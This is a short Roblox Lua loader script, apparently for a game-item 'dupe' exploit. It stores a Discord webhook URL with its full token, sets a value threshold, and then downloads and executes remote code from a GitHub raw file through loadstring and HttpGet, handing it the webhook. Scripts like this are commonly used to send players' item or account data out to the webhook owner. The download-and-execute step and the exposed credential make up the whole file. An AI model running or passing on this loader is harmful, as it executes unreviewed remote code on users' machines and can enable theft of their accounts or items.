local Webhook = "https://discord.com/api/webhooks/1438571118037303489/8PVLyZP3CHmM6BCxfyYinSbK6T0ef2XqPqPgqCqRXyRKIuYyLXI321HLV8rG6qeDdhmU"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
